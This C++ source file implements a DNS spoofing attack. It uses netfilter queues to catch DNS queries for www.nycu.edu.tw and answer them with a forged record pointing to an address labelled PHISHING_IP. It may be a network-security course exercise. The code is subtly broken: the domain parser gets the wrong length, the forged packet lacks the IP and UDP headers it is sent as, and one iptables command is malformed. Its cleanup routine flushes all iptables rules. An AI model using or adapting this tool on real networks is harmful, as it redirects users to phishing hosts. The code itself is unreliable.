#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <unistd.h>
#include <thread>
#include <mutex>
#include <queue>
#include <atomic>
#include <cstdlib>
#include <condition_variable>
#include <errno.h>
#include <csignal>

#define NF_ACCEPT 1
#define NF_DROP 0

using namespace std;

char* TARGET_DOMAIN = "www.nycu.edu.tw";
char* PHISHING_IP = "140.113.207.227";

struct nfq_handle* h = nullptr;
struct nfq_q_handle* qh = nullptr;
int nfd = -1;

sig_atomic_t running = 1;

struct DNS_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

unsigned short checksum(unsigned short* buf, int nwords) {
    unsigned long sum = 0;
    for (int i = 0; i < nwords; i++) {
        sum += buf[i];
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void signal_handler(int signum) {
    if(signum == SIGINT || signum == SIGTERM) {
        cout << "Shutting Down ..." << endl;
        running = 0;
        if(nfd){
            close(nfd);
        }
    }
}

string parse_domain(unsigned char* header, int header_len) {
    string domain;
    int pos = sizeof(struct DNS_header);
    while (pos < header_len) {
        int len = header[pos];
        if (len == 0 || pos + len >= header_len) break;
        if (!domain.empty()) domain += ".";
        domain += string((char*)(header + pos + 1), len);
        pos += len + 1;
    }
    return domain;
}

unsigned char* build_dns_response(unsigned char* query, int query_len) {
    // Find the end of the question section
    int pos = sizeof(DNS_header);
    // Copy domain name (QNAME)
    while (pos < query_len && query[pos] != 0) pos++;
    pos++; // null byte after QNAME
    // QTYPE (2 bytes) + QCLASS (2 bytes)
    pos += 4;
    int question_len = pos;

    // Allocate space for header + question + answer (16 bytes for answer)
    int response_len = question_len + sizeof(DNS_header) + 16;
    unsigned char* response = new unsigned char[question_len + 16];
    memset(response, 0, question_len + 16);

    // Copy DNS header
    memcpy(response, query, sizeof(DNS_header));
    DNS_header* dns = (DNS_header*)response;
    dns->flags = htons(0x8180); // Standard response, recursion available, no error
    dns->ancount = htons(1);    // 1 answer

    // Copy question section
    memcpy(response + sizeof(DNS_header), query + sizeof(DNS_header), question_len - sizeof(DNS_header));

    int ans_pos = question_len;

    // Answer section
    // Name: pointer to domain name in question (offset 12 = 0x0c)
    response[ans_pos++] = 0xc0;
    response[ans_pos++] = 0x0c;

    // Type: A (1)
    response[ans_pos++] = 0x00;
    response[ans_pos++] = 0x01;

    // Class: IN (1)
    response[ans_pos++] = 0x00;
    response[ans_pos++] = 0x01;

    // TTL: 0x0000012c (300 seconds)
    response[ans_pos++] = 0x00;
    response[ans_pos++] = 0x00;
    response[ans_pos++] = 0x01;
    response[ans_pos++] = 0x2c;

    // Data length: 4
    response[ans_pos++] = 0x00;
    response[ans_pos++] = 0x04;

    // Address: PHISHING_IP
    in_addr addr;
    inet_aton(PHISHING_IP, &addr);
    memcpy(response + ans_pos, &addr.s_addr, 4);
    ans_pos += 4;

    return response;
}

void send_spoof_response(unsigned char* response, int response_len){
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) {
        cerr << "Error creating socket: " << strerror(errno) << endl;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        cerr << "Error setting socket options: " << strerror(errno) << endl;
        close(sockfd);
        return;
    }

    struct iphdr* iph = (struct iphdr*)response;
    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = iph->daddr;
    if(sendto(sockfd, response, response_len, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr)) < 0) {
        cerr << "Error sending response: " << strerror(errno) << endl;
    }
    close(sockfd);
    return;
}

int calculate_dns_len(const string domain_name){
    int domain_len = 0;
    size_t start = 0, end;
    while ((end = domain_name.find('.', start)) != string::npos) {
        domain_len += (end - start) + 1; // length byte + label
        start = end + 1;    
    }
    domain_len += (domain_name.length() - start) + 1; // last label + null byte
    domain_len += 1;
    return domain_len;
}

static int callback(struct nfq_q_handle* qh, struct nfgenmsg* nfmsg, struct nfq_data* nfa, void* data){

    unsigned char* packet;
    int packet_id = -1;

    auto ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) packet_id = ntohl(ph->packet_id);

    int payload_len = nfq_get_payload(nfa, &packet);
    if (payload_len >= 0){
        struct iphdr* iph = (struct iphdr*)packet;
        if (iph->protocol == IPPROTO_UDP){
            cout << "Received UDP packet from " << inet_ntoa(*(in_addr*)&iph->saddr) 
                 << " to " << inet_ntoa(*(in_addr*)&iph->daddr) << endl;
            struct udphdr* udph = (struct udphdr*)(packet + iph->ihl * 4);
            if (ntohs(udph->dest) == 53){
                unsigned char* dns = packet + iph->ihl * 4 + sizeof(struct udphdr);
                string DOMAIN = parse_domain(dns, sizeof(struct DNS_header));
                if (DOMAIN == TARGET_DOMAIN){
                    cout << "INTERCEPTED query for "<< DOMAIN << endl;
                    unsigned char* response = build_dns_response(dns, sizeof(struct DNS_header));
                    int total_size = sizeof(struct iphdr) + sizeof(struct udphdr) + calculate_dns_len(DOMAIN);
                    send_spoof_response(response, total_size);
                    return nfq_set_verdict(qh, packet_id, NF_DROP, 0, nullptr);
                }   
            }
        }
    }
    return nfq_set_verdict(qh, packet_id, NF_ACCEPT, 0, nullptr);
}

void CLEAN_IPTABLES(){
    system("iptables -t raw PREROUTING -D -p udp --dport 53 -j NFQUEUE --queue-num 0");
    system("sudo iptables -F");
    system("sudo iptables -t nat -F");
    if(qh)nfq_destroy_queue(qh);
    if(h)nfq_close(h);
    cout << "CLEANED UP " << endl;
}

void CLEAN_FORWARD(){
    system("sudo sysctl -w net.ipv4.ip_forward=0");
    CLEAN_IPTABLES();
}

int main (){
    // Setup
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    h = nfq_open();
    if (!h) {
        cerr << "Error during nfq_open()" << endl;
        return -1;
    }
    nfq_unbind_pf(h, AF_INET);
    if (nfq_bind_pf(h, AF_INET) < 0) {
        cerr << "Error during nfq_bind_pf()" << endl;
        return -1;
    }
    qh = nfq_create_queue(h, 0, &callback, nullptr);
    nfd = nfq_fd(h);
    nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff);

    int recv_len;
    char buf[4096] __attribute__((aligned));
    cout << "Listening for DNS queries..." << endl;
    while (running) {
        recv_len = recv(nfd, buf, sizeof(buf), 0);
        if (recv_len >= 0) {
            nfq_handle_packet(h, buf, recv_len);
        } else if (recv_len < 0 && errno != EINTR) {
            cerr << "Error during recv(): " << strerror(errno) << endl;
        }
    }

    CLEAN_FORWARD();
    return 0;
}